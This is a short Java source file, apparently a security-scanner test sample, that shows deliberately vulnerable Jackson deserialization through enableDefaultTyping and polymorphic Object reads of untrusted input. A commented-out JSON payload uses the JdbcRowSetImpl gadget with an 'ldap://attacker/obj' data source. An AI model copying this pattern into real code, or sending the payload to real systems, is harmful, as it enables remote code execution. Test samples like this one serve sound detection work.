package com.checkmarx.fasterxml;

import java.io.IOException;
import java.util.List;


import com.fasterxml.jackson.databind.ObjectMapper;

public class JacksonEnableDefaultTyping {

	// Vulnerable: enableDefaultTyping
	public void enableDefaultTyping(String json) throws Exception {
		
	    ObjectMapper om = new ObjectMapper();
	    om.enableDefaultTyping();
	    Object o = om.readValue(json, List.class);
	}
	
	// Vulnerable: due to 'Object' used
	public void objectPolymorphism(String json) throws Exception {
 	    ObjectMapper om1 = new ObjectMapper();
	    Object o = om1.readValue(json, List.class);
	}
	
	public static void main(String[] args) throws Exception {
		
		JacksonEnableDefaultTyping app = new JacksonEnableDefaultTyping();
		
		/*
		String json = "[\"java.util.List\", [[\"com.sun.rowset.JdbcRowSetImpl\" ,{\n" +
	            "\"dataSourceName\":\n" +
	            "\"ldap://attacker/obj\" ,\n" +
	            "\"autoCommit\" : true\n" +
	            "}]]]";
		*/
		
		String json = args[0];
		app.enableDefaultTyping(json);
		app.objectPolymorphism(json);
		
	}
}
